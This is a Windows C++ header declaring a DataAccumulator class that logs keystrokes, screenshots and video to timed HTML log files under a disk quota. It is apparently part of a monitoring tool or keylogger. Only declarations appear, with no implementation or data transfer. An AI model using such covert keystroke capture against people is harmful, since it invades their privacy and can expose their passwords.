#pragma once
#include <Windows.h>
#include "DiskQuotaWatcher.h"

class DataAccumulator
{
private:
	static const int BUFFER_SIZE;
	static const int LOG_FILE_NAME_LENGTH;
	static const PSTR const DATA_FILE_NAME;
	static const PWSTR const SECTION_END_TAGS;

	BOOL mIsFirstLog; // TODO: mIsFirstLogToday
	DiskQuotaWatcher* quotaWatcher;
	FILETIME mLastLogTime;
	SYSTEMTIME mFirstLogInFile; // TODO: mFirstLogInFileTime
	int mCurrentChunkLength;
	WCHAR* chunk;
	PSTR mCurrentLogFile;
	BOOL mPreviousRowExists;
	BOOL mPreviousParagraphExists;
	BOOL mIsLogFileGenerated;
	HANDLE mLogLockEvent;
	int GetElapsedSecondsFrom(FILETIME* date, BOOL updateDate);
	int GetElapsedSecondsFromLastLog();
	void Log2HTML(PWSTR htmlString);
	void Append2Log(PWSTR appendee);
	void FlushChunk();
	void GenerateLogFileName(PSTR fileName);

	LPCWSTR GetHtmlFromResource(int resourceId, PWORD length);

public:
	DataAccumulator(void);
	~DataAccumulator(void);
	void SetDiskQuota(int quota) { quotaWatcher->SetQuota(quota);}
	void RegisterNewFile(PSTR fileName) { quotaWatcher->RegisterNewFile(fileName); }
	void LogKey(PWSTR key);
	void LogVideo(PTSTR videoFile);
	void LogPrintScreen(PTSTR imageFile);
};

